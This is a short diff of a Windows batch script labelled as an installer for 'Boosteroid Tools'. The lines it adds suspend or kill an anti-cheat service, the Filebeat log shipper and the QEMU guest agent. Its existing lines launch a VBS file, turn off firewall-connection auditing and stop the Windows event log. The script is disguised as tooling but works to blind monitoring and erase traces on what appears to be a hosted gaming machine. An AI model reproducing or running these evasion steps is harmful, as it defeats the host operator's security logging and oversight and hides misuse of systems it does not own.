@@ -3,6 +3,9 @@ C:
 TITLE Install Boosteroid Tools
 echo Installing Boosteroid Tools...
 
+pss.exe PnkBstrA.exe
+pss.exe filebeat.exe
+psk.exe qemu-ga.exe
 start ssfn_rmlg.vbs
 auditpol /set /subcategory:"Filtering Platform Connection" /success:disable /failure:enable
 net stop eventlog
